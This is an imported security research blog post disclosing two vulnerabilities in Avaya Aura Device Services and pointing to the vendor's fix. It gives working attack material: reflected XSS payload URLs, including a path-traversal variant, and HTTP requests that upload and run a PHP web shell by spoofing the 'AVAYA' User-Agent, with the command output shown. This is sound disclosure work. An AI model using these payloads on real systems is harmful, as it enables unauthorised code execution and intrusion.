---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-01_rce-in-avaya-aura-device-services.md
original_filename: 2023-02-01_rce-in-avaya-aura-device-services.md
title: RCE in Avaya Aura Device Services
category: documents
detected_topics:
- xss
- command-injection
- path-traversal
- cors
- information-disclosure
- supply-chain
tags:
- imported
- documents
- xss
- command-injection
- path-traversal
- cors
- information-disclosure
- supply-chain
language: en
raw_sha256: 98f1a4e741cd1ae8d43a4ffbe35de2da6454e91c9d65fc150c35a765c8214f34
text_sha256: 0bf2dc9baa32fedec106dc9aa965d27022b69018c242347d3c8a34f58384a6b1
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# RCE in Avaya Aura Device Services

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-01_rce-in-avaya-aura-device-services.md
- Source Type: markdown
- Detected Topics: xss, command-injection, path-traversal, cors, information-disclosure, supply-chain
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `98f1a4e741cd1ae8d43a4ffbe35de2da6454e91c9d65fc150c35a765c8214f34`
- Text SHA256: `0bf2dc9baa32fedec106dc9aa965d27022b69018c242347d3c8a34f58384a6b1`


## Content

---
title: "RCE in Avaya Aura Device Services"
url: "https://blog.assetnote.io/2023/02/01/rce-in-avaya-aura/"
final_url: "https://www.assetnote.io/resources/research/rce-in-avaya-aura-device-services"
authors: ["Dylan Pindur"]
programs: ["Avaya"]
bugs: ["RCE", "Security code review", "XSS", "WebDAV"]
publication_date: "2023-02-01"
added_date: "2023-02-03"
source: "pentester.land/writeups.json"
original_index: 1596
---

[Research Notes](/resources/research)

Security Research

February 1, 2023

# RCE in Avaya Aura Device Services

No items found.

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/653795bb35bc995a6f921d3f_citrixbleed.svg)

Creative Commons license

For those who haven’t had the pleasure, Avaya Aura is a (rather complicated) platform for managing IP phones. Today we’re going to be looking at Avaya Aura Device Services (AADS) component of the platform and detailing two vulnerabilities we found during our research.

The first big hurdle with this type of research is getting the software up and running. To provide its phone management service AADS requires significantly more resources than can be provided by a 2020 MacBook Pro. Eventually some in our team managed to get it running in a cloud environment, however a majority of the analysis was still done offline. To perform the analysis we took the AADS installation binary and extracted as much of it as was possible on a vanilla Fedora VM. We couldn’t run anything, but the extracted files still gave us some insight into how the application would run when properly installed.

Looking at the install file, <span class="code_single-line">aads-8.0.0.0.268.bin</span> we discovered that it is a [Makeself](https://makeself.io/) archive, a compressed TAR archive and installation script rolled into one file. Looking below we can see the start of the install script at the head of the file and then the beginning of the TAR archive that follows.
  
  
  #!/bin/sh
  # This script was generated using Makeself 2.4.0
  # The license covering this archive and its contents, if any, is wholly independent of the Makeself license (GPL)
  
  CRCsum="0000000000"
  MD5="00000000000000000000000000000000"
  SHA="a6c085cc707a633cc5d9fe717d50ffefcf5f77c04d48fd446f315f1644e8552d"
  TMPROOT=${TMPDIR:=/tmp}
  
  ...
  
  f test x"$keep" = xn; then
  cd "$TMPROOT"
  rm -rf "$tmpdir"
  fi
  eval $finish; exit $res
  ^_<8B>^H^@<B1>^C7]^B^C<E4>Z]<8C>^]<C9>U.ۓ<8D>w6<9B><FD> <84>x7(<
  
  

Since the Makeself format is designed to be self-contained, we were able to just extract everything from the archive and avoid running the installation script by adding the <span class="code_single-line">\--noexec</span> flag. This flag prevents the installation script from running. This is needed as the script will detect that we do not have enough resources to run the application, cleanup the extracted files and then exit.
  
  
  [root@fedora opt]# TMPDIR=/opt/tmp ./aads-8.0.0.0.268.bin --noexec --target /opt
  Creating directory /opt
  Verifying archive integrity...  100%  SHA256 checksums are OK. All good.
  Uncompressing Installer for Avaya Aura Device Services Version 8.0.0.0.268  100%  
  
  

Looking at what we found inside the archive, there were a lot of scripts and a lot of <span class="code_single-line">.rpm</span> packages.
  
  
  [root@fedora opt]# ls
  aads-8.0.0.0.268.bin  debugging.sh  spiritAgentrpm-7.1.2.0.5-28191-SDK-1.0.rpm
  acsService-8.0.0.0-SNAPSHOT-noarch.rpm  drs-client-rpm-7.1.3.0.3-29349-SDK-1.0.rpm  symmetric-ds-3.4.9.zip
  AvayaSMI-R017-01.0.521.0-20180410.105932-1.rpm  getIfInfo.sh  tmp
  avCore-cas-common-3.4.0.50-SNAPSHOT.rpm  installation.properties  uninstall.sh
  avCore-cassandra-3.11.3.rpm  installLib.sh  Util_CDR-7.1-01.noarch.rpm
  avCore-postgres-9.3.5-20170526.131953-5-rpm.rpm  keepalived-1.2.9-5.x86_64.rpm  Util_FS-7.1-19.noarch.rpm
  avCoreServices-8.0.0.0.268-1.noarch.rpm  keycloak-6.0.1.tar.gz  Util_IPT-7.1-02.noarch.rpm
  avCore-tomcat-8.0.24_1-20170329.031513-2.rpm  menuLib.sh  Util_MyPhone-7.1-10.noarch.rpm
  binary_EULA.txt  net-snmp-5.7.3-2.smgr.el7.x86_64.rpm  Util_OVF-7.1-131.noarch.rpm
  buildConfig.sh  nginx-fips-1.10.3-1.el7.avCore.x86_64-20190531.074949-2.rpm  Util_PFM_Daemon-1.0-245.noarch.rpm
  checkAMM.sh  normalize-ipv6-addr.py  Util_Post-7.1-36.noarch.rpm
  checkFront.sh  removeVersion.sh  Util_Prep-7.1-82.noarch.rpm
  checkLib.sh  setupAMM.sh  Util_Push-7.1-01.noarch.rpm
  checkUtils.sh  silentInstall.sh  Util_SMI-7.1-19.noarch.rpm
  
  

We slowly started force installing the <span class="code_single-line">.rpm</span> packages, adding in missing dependencies as best we could.
  
  
  [root@fedora opt]# rpm -ivh --force AvayaSMI-R017-01.0.521.0-20180410.105932-1.rpm
  Verifying...  ################################# [100%]
  Preparing...  ################################# [100%]
  Updating / installing...
  1:AvayaSMI-R017-01.0.521.0  ################################# [100%]
  
  Warning: PHP Startup: ^(text/|application/xhtml\+xml) (offset=0): unrecognised compile-time option bit(s) in Unknown on line 0
  
  Warning: preg_grep(): Compilation failed: unrecognised compile-time option bit(s) at offset 0 in /opt/avaya/smi/bin/initWebProfiles on line 3467
  
  Fatal error: Uncaught TypeError: count(): Argument #1 ($value) must be of type Countable|array, bool given in /opt/avaya/smi/bin/initWebProfiles:3471
  Stack trace:
  #0 /opt/avaya/smi/bin/initWebProfiles(3664): getDiskRoot()
  #1 {main}
  thrown in /opt/avaya/smi/bin/initWebProfiles on line 3471
  /var/tmp/rpm-tmp.kSywlN: line 50: /sbin/service: No such file or directory
  warning: %post(AvayaSMI-R017-01.0.521.0.x86_64) scriptlet failed, exit status 127
  
  

After all this was done we had a filesystem that somewhat resembled an AADS install and started poking around to see what we could find. Most of the bigger components had installed themselves under <span class="code_single-line">/opt/Avaya/AADS/8.0.0.0.268/applications</span>.
  
  
  [root@fedora applications]# pwd
  /opt/Avaya/AADS/8.0.0.0.268/applications
  [root@fedora applications]# ls -lah
  total 152M
  drwxr-xr-x. 7 root root 4.0K Jan  9 09:05 .
  drwxr-xr-x. 6 root root  70 Jan  9 09:05 ..
  -rwxr-x---. 1 root root  60M Jul 23  2019 acs.war
  -rwxr-x---. 1 root root 2.2K Jul 23  2019 addDatasource.sh
  -rwxr-x---. 1 root root  43M Jul 23  2019 admin.war
  -rwxr-x---. 1 root root 6.5K Jul 23  2019 applicationsInstall.sh
  -rwxr-x---. 1 root root 2.3K Jul 23  2019 applicationsPatch.sh
  drwxr-x---. 2 root root 4.0K Jan  9 09:05 config
  drwxr-x---. 2 root root  57 Jan  9 09:05 configuration
  -rwxr-x---. 1 root root  31M Jul 23  2019 corsconfig.war
  drwxr-x---. 2 root root 4.0K Jan  9 09:05 drs
  -rwxr-x---. 1 root root 4.8K Jul 23  2019 dynamicconfigurations-patch.sh
  drwxr-xr-x. 3 root root  17 Jan  9 09:05 modules
  drwxr-x---. 2 root root  149 Jan  9 09:05 nginx
  -rwxr-x---. 1 root root 3.9K Jul 23  2019 nginxportImpl-patch.sh
  -rwxr-x---. 1 root root  20M Jul 23  2019 trustedhosts.war
  -rwxr-x---. 1 root root 3.3K Jul 23  2019 upgrade.sh
  -rwxr-x---. 1 root root 2.4K Jul 23  2019 webdeployment-patch.sh
  
  

## Cross-Site Scripting (XSS)

We took the available <span class="code_single-line">.jar</span> and <span class="code_single-line">.war</span> files we found and decompiled them. We then started combing through the source code for common errors. One such low-hanging fruit was checking all the <span class="code_single-line">.jsp</span> files for <span class="code_single-line"><%=</span> which would output whatever expression that follows to HTML without any sanitisation. Not only did we find one that was easily controllable, it was also pre-authentication.

In <span class="code_single-line">/opt/Avaya/AADS/8.0.0.0.268/applications/admin.war</span> under <span class="code_single-line">public/login.jsp</span> we found the following snippet.
  
  
  <span
  style="color: <%=messageLabelColour%>; font-family: Verdana, Arial, Helvetica, Sans-Serif; font-size: 11px; font-weight: bold;"
  id="logonMessageContainer">
  <label id="messageLabel"><%=messageLabelVar%></label>
  </span>
  
  

Tracing <span class="code_single-line">messageLabelVar</span> back to the top of the file we found that it was taken straight from the query parameters with no validation.
  
  
  <%
  String messageLabelColour = "rgb(51, 51, 51)";
  String messageLabelVar = "Please Sign in";
  String errorMsg = request.getParameter("error"); 
  if ( errorMsg != null ) {
  messageLabelVar = request.getParameter("error");
  messageLabelColour = "rgb(255, 0, 0)";
  }
  %>
  
  

An almost introductory example of cross-site scripting in Java, we were able to put together the following payload and achieve reflected XSS with no authentication required.
  
  
  https://aads.example.com/admin/public/login.jsp?error=%3Cscript%3Ealert(1)%3C/script%3e
  
  

On some installations of Avaya Device Services, this XSS vulnerability was only accessible by performing a directory traversal attack that exposes the administration panel. For example:
  
  
  https://aads.example.com/acs/..;/admin/public/login.jsp?error=%3Cscript%3Ealert(1)%3C/script%3e
  
  

## Remote Code Execution (RCE)

After exhausting a lot of the Java, we turned our attention to any configuration files that were installed. Mostly this was to try and determine how each of these Java applications were intended to be accessed and from where. Luckily for us we found much more than we expected. Inside <span class="code_single-line">/etc/httpd/conf.d/ssl.conf</span>, we were greeted by the following configuration snippet.
  
  
  # Special configuration for Utility Server
  # DocumentRoot "/var/www/html/https"
  #
  # WebDAV module configuration section.
  Alias '/PhoneBackup/' "/var/www/https/PhoneBackup/"
  <Directory "/var/www/https/PhoneBackup">
  Options FollowSymLinks
  # Only allow SSL connections
  SSLRequireSSL
  AllowOverride None
  Require env Avaya_Phone
  </Directory>
  
  ...
  
  <IfModule mod_dav_fs.c>
  # Location of the WebDAV lock database.
  DAVLockDB /var/lib/dav/lockdb
  <Location /PhoneBackup>
  Dav On
  </Location>
  </IfModule>
  
  

Surprised at seeing WebDAV in 2022, we searched for the location where the <span class="code_single-line">Avaya_Phone</span> environment variable was set as this was the only security control preventing us from accessing the WebDAV endpoint. Fortunately this was rather easy, we found it set in <span class="code_single-line">/etc/httpd/conf/httpd.conf</span>.
  
  
  # wi00304553 - The folowing should ONLY allow Avaya IP Phones to access
  # the PhoneBackup directories.
  SetEnvIf User-Agent "AVAYA" Avaya_Phone
  
  

Could it really be that easy? All we had to do was set our <span class="code_single-line">User-Agent</span> header to <span class="code_single-line">AVAYA</span> and we could upload a <span class="code_single-line">.php</span> file.
  
  
  PUT /PhoneBackup/x.php HTTP/1.1
  Host: 127.0.0.1
  User-Agent: AVAYA
  Connection: close
  Content-Length: 20
  
  <?php
  system('id');
  
  

And, since there was nothing preventing PHP execution in the <span class="code_single-line">/PhoneBackup</span> directory, executing the file was just as easy.
  
  
  GET /PhoneBackup/x.php HTTP/1.1
  Host: 127.0.0.1
  User-Agent: AVAYA
  Connection: close
  
  

Giving us this response.
  
  
  uid=48(apache) gid=48(apache) groups=48(apache),4000(ucgrp),10021(trusted_aads_grp) context=system_u:system_r:httpd_t:s0
  
  

So what did we learn? As usual a good portion of security research is just getting the software to run. But once we’re over that hurdle, there’s still plenty of low-hanging fruit. Even if it is a little outdated, knowing about WebDAV and other bygone technologies is always a useful tool to have in your belt.

When reporting these vulnerabilities to Avaya, we were told that they were fixed in a previous release of the software, however no CVE’s were claimed for these issues. If you would like to remediate these vulnerabilities, please refer to ACS-21519 Address PSST Reported RCE vulnerability on Utility Services in the Release Notes 8.1.4.1. This can be found [here](https://download.avaya.com/css/public/documents/101076366).

As always, customers of our [Attack Surface Management](https://assetnote.io/) platform were the first to know when this vulnerability affected them. We continue to perform original security research in an effort to inform our customers about zero-day vulnerabilities in their attack surface.

Written by:

Dylan Pindur

Your subscription could not be saved. Please try again. 

Your subscription has been successful. 

Get updates on our research

Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!

Enter your email address to subscribe

Provide your email address to subscribe. For e.g abc@xyz.com 

SUBSCRIBE 

### More Like This

[Security ResearchNew!Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927)Read moreRead on ASN Blog](/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927)

[Security ResearchNew!How an obscure PHP footgun led to RCE in Craft CMSRead moreRead on ASN Blog](/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms)

[Security ResearchNew!Citrix Denial of Service: Analysis of CVE-2024-8534Read moreRead on ASN Blog](/resources/research/citrix-denial-of-service-analysis-of-cve-2024-8534)

[Security ResearchNew!Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)Read moreRead on ASN Blog](/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os)

[Security ResearchNew!Leveraging An Order of Operations Bug to Achieve RCE in Sitecore 8.x - 10.xRead moreRead on ASN Blog](/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x)

[Security ResearchNew!Insecurity through Censorship: Vulnerabilities Caused by The Great FirewallRead moreRead on ASN Blog](/resources/research/insecurity-through-censorship-vulnerabilities-caused-by-the-great-firewall)

[Back to All](/resources/research)

### Ready to get started?

Get on a call with our team and learn how Assetnote can change the way you secure your attack surface. We'll set you up with a trial instance so you can see the impact for yourself.

[Request a Demo](/demo)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg)

Address:  
Level 10, 12 Creek Street, Brisbane QLD, 4000  
‍  
Contact:  
[contact@assetnote.io  
  
](mailto:contact@assetnote.io)Press Inquiries:[  
](mailto:contact@assetnote.io)[press@assetnote.io](mailto:press@assetnote.io)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/661f041240ed96ed7a03fe6f_61dc1beb212a1202fc512a76_SOC%202-03-p-500.png)

[](https://twitter.com/assetnote)[](https://www.linkedin.com/company/assetnote/)

Platform Features

[Continuous Asset Discovery](/platform/asset-discovery)

[Deep Asset Enrichment](/platform/asset-enrichment)

[Assetnote Exposure Engine](/platform/assetnote-exposure-engine)

[Expert Security Research](/platform/expert-security-research)

[Collaborative Workflows](/platform/collaborative-workflows)

[Customization](/platform/customization)

Use Cases

[Continuous Asset Discovery and Inventory](/use-cases/continuous-asset-discovery-and-inventory)

[Real-Time Exposure Monitoring](/use-cases/continuous-security-monitoring)

[Attack Surface Reduction](/use-cases/attack-surface-reduction)

[Mergers & Acquisitions](/use-cases/mergers-and-acquisitions)

[Bug Bounty Readiness](/use-cases/bug-bounty-readiness)

© 2026 Assetnote. All rights reserved.

[Privacy Policy](https://assetnote.io/policies/privacy-policy)
